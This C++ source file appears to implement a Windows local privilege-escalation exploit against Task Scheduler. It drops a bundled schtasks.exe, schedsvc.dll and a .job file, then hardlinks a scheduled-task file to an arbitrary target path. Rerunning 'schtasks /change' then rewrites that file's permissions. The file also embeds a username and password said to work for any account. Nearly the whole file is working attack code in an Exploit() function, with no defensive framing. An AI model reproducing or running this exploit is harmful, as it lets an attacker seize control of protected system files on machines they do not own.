#include <Windows.h>
#include <stdio.h>

#include <stdlib.h>
#include <iostream>
#include <shlobj.h>
#include "Resources.h"

#pragma comment(lib, "shell32.lib")
bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname);

wchar_t* GetTargetPath();

// Credentials to ANY account on the machine
const char USERNAME[] = "kenny";
const char PASSWORD[] = "N55L@bs";


int WriteResource(unsigned char data[], unsigned long size, const wchar_t* outfilepath)
{
	// Write data to outfilepath

	HANDLE hFile;
	DWORD dwBytesToWrite = (DWORD)size;
	DWORD dwBytesWritten = 0;
	BOOL bErrorFlag = FALSE;

	wprintf(outfilepath);
	printf("\n");

	hFile = CreateFile(outfilepath,                // name of the write
		GENERIC_WRITE,          // open for writing
		0,                      // do not share
		NULL,                   // default security
		CREATE_ALWAYS,             // create new file only
		FILE_ATTRIBUTE_NORMAL,  // normal file
		NULL);                  // no attr. template

	if (hFile == INVALID_HANDLE_VALUE)
	{
		return 1;
	}

	//printf(TEXT("Writing %d bytes to %s.\n"), dwBytesToWrite, outfilepath);

	bErrorFlag = WriteFile(
		hFile,           // open file handle
		data,      // start of data to write
		dwBytesToWrite,  // number of bytes to write
		&dwBytesWritten, // number of bytes that were written
		NULL);            // no overlapped structure

	if (FALSE == bErrorFlag)
	{
		return 1;
	}
	else
	{
		if (dwBytesWritten != dwBytesToWrite)
		{
			// This is an error because a synchronous write that results in
			// success (WriteFile returns TRUE) should write all data as
			// requested. This would not necessarily be the case for
			// asynchronous writes.
			return 1;
		}
		else
		{
			//_tprintf(TEXT("Wrote %d bytes to %s successfully.\n"), dwBytesWritten, argv[1]);
		}
	}

	CloseHandle(hFile);

	return 0;
}

int WriteDacl(wchar_t* outfilepath)
{
	DeleteFile(L"c:\\windows\\system32\\tasks\\Beer");
	char username[255];
	char password[255];
	strcpy_s(username, USERNAME);
	strcpy_s(password, PASSWORD);
	std::string command = "C:\\Users\\Public\\schtasks.exe /change /TN \"beer\" /RU ";
	std::string usernamestd(username);
	std::string passwordstd(password);
	command.append(usernamestd);
	command.append(" /RP ");
	command.append(passwordstd);
	WriteResource(Bear_job_Bytes, Bear_job_Size, L"c:\\windows\\tasks\\beer.job");
	WriteResource(schtasks_exe_Bytes, schtasks_exe_Size, L"c:\\Users\\Public\\schtasks.exe");
	WriteResource(schedsvc_dll_Bytes, schedsvc_dll_Size, L"c:\\Users\\Public\\schedsvc.dll");
	system(command.c_str());
	DeleteFile(L"c:\\windows\\system32\\tasks\\Beer");
	CreateNativeHardlink(L"c:\\windows\\system32\\tasks\\beer", outfilepath);
	system(command.c_str());

	return 0;
}

void Exploit()
{
	WriteDacl(GetTargetPath());
}